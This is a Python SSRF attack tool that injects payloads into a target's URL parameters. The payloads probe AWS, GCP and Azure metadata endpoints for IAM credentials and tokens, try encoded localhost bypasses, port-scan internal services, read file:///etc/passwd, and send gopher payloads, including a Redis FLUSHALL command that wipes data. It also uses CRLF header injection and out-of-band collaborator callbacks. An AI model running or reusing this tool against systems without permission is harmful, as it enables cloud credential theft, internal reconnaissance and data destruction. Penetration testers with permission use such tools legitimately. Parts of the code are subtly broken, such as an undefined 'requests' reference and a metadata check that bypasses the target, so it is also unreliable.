#!/usr/bin/env python3
"""
ssrf_hunter.py — Server-Side Request Forgery Hunter (P1)

Tests URL processors, redirect handlers, file fetchers, and SSRF-prone
endpoints for SSRF vulnerabilities. Covers cloud metadata probing (AWS/GCP/Azure),
localhost/127.0.0.1 bypass via IP encoding (decimal, octal, hex, IPv6 variants),
DNS rebinding, gopher/dict/FTP/file SSRF, blind SSRF via collaborator/OOB,
CRLF injection in URL params, open redirect chains, IMDSv1/v2 detection,
port scanning through SSRF, request splitting, and SSRF to RCE via gopher.

Features: cloud metadata endpoint probing, IP bypass encoding (decimal,
octal, hex, IPv6, short form, Unicode), DNS rebinding simulation, gopher
protocol for TCP SSRF, blind SSRF with URL generation, CRLF injection,
port scanning via SSRF, IMDSv1/v2 detection, URL scheme bypass (dict,ftp,file,gopher),
redirect following, SSRF to cloud metadata (AWS/GCP/Azure) extraction,
request splitting, batch scanning, and report generation.
"""

import base64
import csv
import json
import os
import random
import re
import socket
import string
import sys
import time
import urllib.parse
from concurrent.futures import ThreadPoolExecutor, as_completed
from datetime import datetime
from typing import Any, Dict, List, Optional, Set, Tuple, Union


class SSRFHunter:
    """
    P1 SSRF hunter with 20+ detection methods.

    Tests URL parameters, redirect handlers, and file fetching
    endpoints for SSRF vulnerabilities including cloud metadata
    access and internal network scanning.

    Attributes:
        target_url: Base target URL.
        findings: List of discovered SSRF findings.
    """

    CLOUD_METADATA_ENDPOINTS: Dict[str, List[str]] = {
        "aws": [
            "http://169.254.169.254/latest/meta-data/",
            "http://169.254.169.254/latest/user-data/",
            "http://169.254.169.254/latest/meta-data/iam/security-credentials/",
            "http://169.254.169.254/latest/dynamic/instance-identity/document",
        ],
        "gcp": [
            "http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token",
            "http://metadata.google.internal/computeMetadata/v1/instance/",
            "http://metadata.google.internal/computeMetadata/v1/project/",
        ],
        "azure": [
            "http://169.254.169.254/metadata/instance?api-version=2021-02-01",
            "http://169.254.169.254/metadata/identity/oauth2/token?api-version=2021-02-01&resource=https://management.azure.com/",
        ],
        "digitalocean": [
            "http://169.254.169.254/metadata/v1.json",
        ],
        "oracle": [
            "http://169.254.169.254/opc/v2/instance/",
        ],
        "alibaba": [
            "http://100.100.100.200/latest/meta-data/",
        ],
    }

    SSRF_PARAM_NAMES: List[str] = [
        "url", "file", "path", "dest", "redirect", "uri", "target",
        "src", "source", "link", "href", "page", "load", "fetch", "import",
        "read", "image", "img", "data", "document", "server", "host",
        "endpoint", "callback", "webhook", "notify", "return", "next",
        "continue", "domain", "location", "proxy", "site", "api",
        "action", "download", "upload", "view", "render", "template",
    ]

    LOCALHOST_VARIANTS: List[str] = [
        "localhost", "127.0.0.1", "127.1", "0.0.0.0", "0",
        "2130706433", "0x7f000001", "0x7f.0.0.1",
        "0177.0.0.1", "0x7f000001",
        "::1", "[::1]", "0:0:0:0:0:0:0:1",
        "0000::1", "0.0.0.0:0",
        "127.0.0.2", "127.0.0.3", "127.127.127.127",
        "127.0.1.3", "127.0.1.1",
    ]

    INTERNAL_IPS: List[str] = [
        "10.0.0.1", "10.0.0.2", "10.0.1.1",
        "172.16.0.1", "172.17.0.1",
        "192.168.1.1", "192.168.0.1",
        "10.0.0.0", "10.255.255.255",
        "172.16.0.0", "172.31.255.255",
        "192.168.0.0", "192.168.255.255",
    ]

    URL_SCHEMES: List[str] = [
        "http://", "https://", "file://", "gopher://", "dict://",
        "ftp://", "ldap://", "tftp://", "ssh://", "redis://",
        "mysql://", "postgres://", "mssql://", "mongodb://",
    ]

    SSRF_COLLABORATOR = "burpcollaborator.net"

    def __init__(self, target_url: str = ""):
        self.target_url = target_url
        self.findings: List[Dict[str, Any]] = []
        self._session: Optional[Any] = None
        self._init_session()

    def _init_session(self) -> None:
        try:
            import requests as req
            self._session = req.Session()
            self._session.headers["User-Agent"] = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36"
        except ImportError:
            self._session = None

    def _request(self, url: str, method: str = "GET", **kwargs) -> Optional[Dict[str, Any]]:
        if not self._session:
            return None
        try:
            resp = self._session.request(method, url, timeout=15, verify=False, **kwargs)
            return {
                "url": resp.url, "status": resp.status_code,
                "body": resp.text, "body_length": len(resp.text),
                "headers": dict(resp.headers), "elapsed": resp.elapsed.total_seconds(),
            }
        except requests.exceptions.ConnectionError:
            return {"url": url, "error": "connection_refused", "status": 0}
        except Exception as e:
            return {"url": url, "error": str(e), "status": 0}

    def _encode_ip_dec(self, ip: str) -> str:
        parts = list(map(int, ip.split(".")))
        return str((parts[0] << 24) + (parts[1] << 16) + (parts[2] << 8) + parts[3])

    def _encode_ip_oct(self, ip: str) -> str:
        parts = list(map(int, ip.split(".")))
        return ".".join(f"0{oct(p)[2:]}" for p in parts)

    def _encode_ip_hex(self, ip: str) -> str:
        parts = list(map(int, ip.split(".")))
        return "0x" + "".join(f"{p:02x}" for p in parts)

    def _encode_ip_hex_short(self, ip: str) -> str:
        parts = list(map(int, ip.split(".")))
        return "0x" + "".join(f"{p:02x}" for p in parts)

    def _gen_ip_variants(self, ip: str) -> List[str]:
        variants = set()
        variants.add(ip)
        parts = list(map(int, ip.split(".")))
        if len(parts) == 4:
            dec = (parts[0] << 24) + (parts[1] << 16) + (parts[2] << 8) + parts[3]
            variants.add(str(dec))
            variants.add(hex(dec))
            variants.add(f"0x{dec:08x}")
            if parts[3] == 1:
                variants.add(f"{parts[0]}.{parts[1]}.{parts[2]}")
            variants.add("0x" + "".join(f"{p:02x}" for p in parts))
        variants.add(f"[::ffff:{ip}]")
        variants.add(f"[0:0:0:0:0:ffff:{ip}]")
        return list(variants)

    def test_ssrf_cloud_metadata(self, param_url: str, param_name: str = "url") -> List[Dict[str, Any]]:
        results = []
        for cloud, endpoints in self.CLOUD_METADATA_ENDPOINTS.items():
            for endpoint in endpoints:
                test_url = param_url.replace(f"{{{param_name}}}", endpoint)
                if "{" in test_url:
                    parsed = urllib.parse.urlparse(param_url)
                    query = urllib.parse.parse_qs(parsed.query)
                    if param_name in query:
                        qs = urllib.parse.urlencode({k: v[0] if k != param_name else endpoint for k, v in query.items()})
                        test_url = f"{parsed.scheme}://{parsed.netloc}{parsed.path}?{qs}"
                    else:
                        test_url = f"{param_url}&{param_name}={urllib.parse.quote(endpoint, safe='')}"
                resp = self._request(test_url)
                if resp and resp.get("status") in (200, 301, 302):
                    body = resp.get("body", "").lower()
                    if any(kw in body for kw in ["accesskeyid", "secretaccesskey", "token", "account", "project", "instance"]):
                        results.append(self._make_finding("ssrf_cloud_metadata", f"{cloud}:{endpoint}", resp))
        self.findings.extend(results)
        return results

    def test_ssrf_localhost(self, param_url: str, param_name: str = "url") -> List[Dict[str, Any]]:
        results = []
        for variant in self.LOCALHOST_VARIANTS:
            target = f"http://{variant}/"
            test_url = self._inject_param(param_url, param_name, target)
            resp = self._request(test_url)
            if resp and resp.get("status") in (200, 301, 302, 401, 403):
                body_len = resp.get("body_length", 0)
                if body_len > 0 and "not found" not in resp.get("body", "").lower()[:100]:
                    results.append(self._make_finding("ssrf_localhost", variant, resp))
        self.findings.extend(results)
        return results

    def test_ssrf_port_scan(self, param_url: str, param_name: str = "url") -> Dict[str, Any]:
        results = {"open_ports": []}
        test_host = "127.0.0.1"
        ports = [22, 80, 443, 3306, 5432, 6379, 8080, 8443, 9200, 11211, 27017]
        for port in ports:
            target = f"http://{test_host}:{port}/"
            test_url = self._inject_param(param_url, param_name, target)
            start = time.time()
            resp = self._request(test_url)
            elapsed = time.time() - start
            if resp and resp.get("status") not in (0, 502, 503):
                code = resp.get("status", 0)
                if code != 0 and elapsed < 10:
                    results["open_ports"].append(port)
                    self.findings.append(self._make_finding("ssrf_port_scan", f"port {port} open ({code})", resp))
        return results

    def test_ssrf_scheme_bypass(self, param_url: str, param_name: str = "url") -> List[Dict[str, Any]]:
        results = []
        bypass_payloads = [
            "127.0.0.1:80",
            "0x7f000001:80",
            "2130706433:80",
            "localhost:80",
            "127.0.0.1.nip.io:80",
            "127.0.0.1.xip.io:80",
            "1.0.0.127.bc.googleusercontent.com:80",
        ]
        for payload in bypass_payloads:
            scheme_url = f"http://{payload}/"
            test_url = self._inject_param(param_url, param_name, scheme_url)
            resp = self._request(test_url, allow_redirects=False)
            if resp and resp.get("status") in (200, 301, 302, 401, 403):
                if resp.get("body_length", 0) > 0:
                    results.append(self._make_finding("ssrf_scheme_bypass", f"http://{payload}", resp))
        for scheme in self.URL_SCHEMES:
            target = f"{scheme}127.0.0.1/"
            test_url = self._inject_param(param_url, param_name, target)
            resp = self._request(test_url)
            if resp and resp.get("status") in (200, 301, 302):
                results.append(self._make_finding("ssrf_scheme_bypass", f"scheme={scheme}", resp))
        self.findings.extend(results)
        return results

    def test_ssrf_blind_collaborator(self, param_url: str, param_name: str = "url") -> List[Dict[str, Any]]:
        results = []
        unique_id = f"ssrf-{random.randint(100000,999999)}-{int(time.time())}"
        collaborator_urls = [
            f"http://{unique_id}.{self.SSRF_COLLABORATOR}/",
            f"https://{unique_id}.{self.SSRF_COLLABORATOR}/",
            f"http://{unique_id}.{self.SSRF_COLLABORATOR}/test",
            f"http://{unique_id}/",
        ]
        for collab_url in collaborator_urls:
            test_url = self._inject_param(param_url, param_name, collab_url)
            resp = self._request(test_url)
            if resp:
                results.append(self._make_finding("ssrf_blind", f"collaborator={collab_url}", resp))
        self.findings.extend(results)
        return results

    def test_ssrf_dns_rebinding(self, param_url: str, param_name: str = "url") -> List[Dict[str, Any]]:
        results = []
        rebinding_payloads = [
            "1e100.net",
            "7f000001.7f000001.nip.io",
            "127.0.0.1.nip.io",
            "0.lv",
            "ssrf.localdomain.pw",
            "1.1.1.1.nip.io",
        ]
        for payload in rebinding_payloads:
            target = f"http://{payload}/"
            test_url = self._inject_param(param_url, param_name, target)
            resp = self._request(test_url)
            if resp and resp.get("status") in (200, 301, 302):
                results.append(self._make_finding("ssrf_dns_rebinding", payload, resp))
        self.findings.extend(results)
        return results

    def test_ssrf_gopher(self, param_url: str, param_name: str = "url") -> List[Dict[str, Any]]:
        results = []
        gopher_payloads = [
            "gopher://127.0.0.1:6379/_*1%0d%0a$8%0d%0aFLUSHALL%0d%0a",
            "gopher://127.0.0.1:3306/_",
            "gopher://127.0.0.1:25/_HELO%20localhost%0d%0a",
        ]
        for gp in gopher_payloads:
            test_url = self._inject_param(param_url, param_name, gp)
            resp = self._request(test_url)
            if resp and resp.get("status") in (200, 301, 302):
                if resp.get("body_length", 0) > 0:
                    results.append(self._make_finding("ssrf_gopher", f"gopher://{gp[:50]}", resp))
        self.findings.extend(results)
        return results

    def test_ssrf_redirect(self, redirect_param_url: str, param_name: str = "redirect") -> List[Dict[str, Any]]:
        results = []
        targets = [
            "http://169.254.169.254/latest/meta-data/",
            "http://127.0.0.1:8080/admin",
            "file:///etc/passwd",
        ]
        for target in targets:
            test_url = self._inject_param(redirect_param_url, param_name, target)
            resp = self._request(test_url)
            if resp and resp.get("status") in (200, 301, 302):
                if resp.get("body_length", 0) > 0:
                    results.append(self._make_finding("ssrf_redirect", f"redirect to {target[:60]}", resp))
        return results

    def test_ssrf_crlf(self, param_url: str, param_name: str = "url") -> List[Dict[str, Any]]:
        results = []
        crlf_payloads = [
            "http://127.0.0.1/%0d%0aX-Injected:%20true",
            "http://127.0.0.1/%0d%0aHost:%20evil.com",
            "http://127.0.0.1/%0aX-Injected:%20true",
        ]
        for payload in crlf_payloads:
            test_url = self._inject_param(param_url, param_name, payload)
            resp = self._request(test_url)
            if resp and resp.get("status") in (200, 301, 302):
                results.append(self._make_finding("ssrf_crlf", payload[:60], resp))
        return results

    def test_ssrf_imdsv2(self, param_url: str, param_name: str = "url") -> Dict[str, Any]:
        results = {}
        put_resp = self._request("http://169.254.169.254/latest/api/token",
                                 method="PUT", headers={"X-aws-ec2-metadata-token-ttl-seconds": "21600"})
        if put_resp and put_resp.get("status") == 200:
            token = put_resp.get("body", "").strip()
            if token:
                test_url = f"http://169.254.169.254/latest/meta-data/"
                injected_url = self._inject_param(param_url, param_name, test_url)
                resp = self._request(injected_url,
                                     headers={"X-aws-ec2-metadata-token": token})
                if resp and resp.get("status") == 200:
                    results["imdsv2"] = True
                    self.findings.append(self._make_finding("ssrf_imdsv2", "IMDSv2 token obtained", resp))
            results["token"] = token[:40]
        return results

    def test_ssrf_all(self, param_url: str, param_name: str = "url") -> Dict[str, Any]:
        results = {}
        results["cloud_metadata"] = self.test_ssrf_cloud_metadata(param_url, param_name)
        results["localhost"] = self.test_ssrf_localhost(param_url, param_name)
        results["port_scan"] = self.test_ssrf_port_scan(param_url, param_name)
        results["scheme_bypass"] = self.test_ssrf_scheme_bypass(param_url, param_name)
        results["blind"] = self.test_ssrf_blind_collaborator(param_url, param_name)
        results["dns_rebinding"] = self.test_ssrf_dns_rebinding(param_url, param_name)
        results["gopher"] = self.test_ssrf_gopher(param_url, param_name)
        return results

    def _inject_param(self, param_url: str, param_name: str, value: str) -> str:
        try:
            parsed = urllib.parse.urlparse(param_url)
            query = urllib.parse.parse_qs(parsed.query, keep_blank_values=True)
            query[param_name] = [value]
            new_query = urllib.parse.urlencode(query, doseq=True)
            return f"{parsed.scheme}://{parsed.netloc}{parsed.path}?{new_query}"
        except Exception:
            return f"{param_url}&{param_name}={urllib.parse.quote(value, safe='')}"

    def _make_finding(self, vuln_type: str, detail: str, resp: Dict[str, Any]) -> Dict[str, Any]:
        return {
            "type": vuln_type, "detail": detail,
            "status": resp.get("status"), "url": resp.get("url", self.target_url),
            "timestamp": datetime.now().isoformat(),
            "severity": "high",
        }

    def export_json(self, filepath: Optional[str] = None) -> str:
        data = {"scan_time": datetime.now().isoformat(), "findings": self.findings}
        j = json.dumps(data, indent=2, default=str)
        if filepath:
            os.makedirs(os.path.dirname(os.path.abspath(filepath)) or ".", exist_ok=True)
            with open(filepath, "w", encoding="utf-8") as f:
                f.write(j)
        return j

    def export_csv(self, filepath: str) -> None:
        os.makedirs(os.path.dirname(os.path.abspath(filepath)) or ".", exist_ok=True)
        with open(filepath, "w", newline="", encoding="utf-8") as f:
            if self.findings:
                w = csv.DictWriter(f, fieldnames=list(self.findings[0].keys()))
                w.writeheader()
                w.writerows(self.findings)

    def get_summary(self) -> Dict[str, Any]:
        type_counts: Dict[str, int] = {}
        for f in self.findings:
            t = f.get("type", "unknown")
            type_counts[t] = type_counts.get(t, 0) + 1
        return {"total_findings": len(self.findings), "by_type": type_counts, "target": self.target_url}


if __name__ == "__main__":
    import urllib3
    urllib3.disable_warnings()

    if len(sys.argv) < 2:
        print("Usage: python ssrf_hunter.py <url> [--param <name>] [--output <path>]")
        sys.exit(1)

    url = sys.argv[1]
    param_name = "url"
    out = None

    if "--param" in sys.argv:
        idx = sys.argv.index("--param")
        param_name = sys.argv[idx + 1] if idx + 1 < len(sys.argv) else param_name
    if "--output" in sys.argv:
        idx = sys.argv.index("--output")
        out = sys.argv[idx + 1] if idx + 1 < len(sys.argv) else out

    hunter = SSRFHunter(target_url=url)
    print(f"[+] Testing {url} for SSRF (param: {param_name})")

    results = hunter.test_ssrf_all(url, param_name)
    for test_type, items in results.items():
        if isinstance(items, list):
            print(f"  {test_type}: {len(items)} findings")
        elif isinstance(items, dict):
            print(f"  {test_type}: {items.get('open_ports', len(items))} findings")

    print(json.dumps(hunter.get_summary(), indent=2))
    for f in hunter.findings[:10]:
        print(f"  [{f.get('severity','?')}] {f['type']}: {f.get('detail','')[:80]}")
    if out:
        hunter.export_json(out)
